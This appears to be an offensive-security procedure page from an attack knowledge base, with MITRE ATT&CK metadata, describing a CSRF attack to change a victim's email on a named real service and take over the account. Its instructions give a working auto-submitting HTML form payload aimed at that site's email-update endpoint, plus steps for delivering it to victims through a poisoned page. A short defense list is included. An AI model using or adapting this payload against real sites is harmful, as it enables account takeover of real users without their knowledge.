---
tags:
  - csrf
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 542c4c57-56de-454b-be77-ffe641da66f8
created_at: '2025-12-13T09:00:34.291Z'
updated_at: '2025-12-13T09:00:34.291Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute CSRF Attack to Change Victim Email

## Summary

This procedure uses the captured CSRF token to craft an auto-submitting HTML form that performs a CSRF attack, changing the victim's email to achieve account takeover.

## Description

Exploiting the lack of proper CSRF protection on /user/update/email, the form is tricked into submission via the poisoned scenario. This allows email change without victim interaction beyond visiting the page. Requires captured token from previous steps. Expected outcome is full account control via email reset.

## Requirements

1. Captured CSRF token and victim details
2. Access to craft and deliver the CSRF payload (e.g., via poisoned page)
3. Vulnerable endpoint on target

## Defense

Defensive measures and detection strategies:

- Implement anti-CSRF tokens with strict validation
- Use SameSite cookies and monitor for anomalous POST requests

## Objectives

1. Change victim's email address
2. Enable password reset
3. Achieve account takeover

## Instructions

### Step 1: Craft CSRF Form

**Context**: Create an HTML file with a form that auto-submits POST to /user/update/email using the token.

> Form example: <form method="POST" action="https://www.smule.com/user/update/email"><input type="hidden" name="csrf_token" value="[captured_token]"><input type="hidden" name="email" value="attacker@email.com"><script>document.forms[0].submit();</script></form>

### Step 2: Deliver and Execute

**Context**: Trick victim into loading the form, e.g., via the poisoned page context.

> Ensure the form submits automatically to change the email.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- csrf
- account-takeover
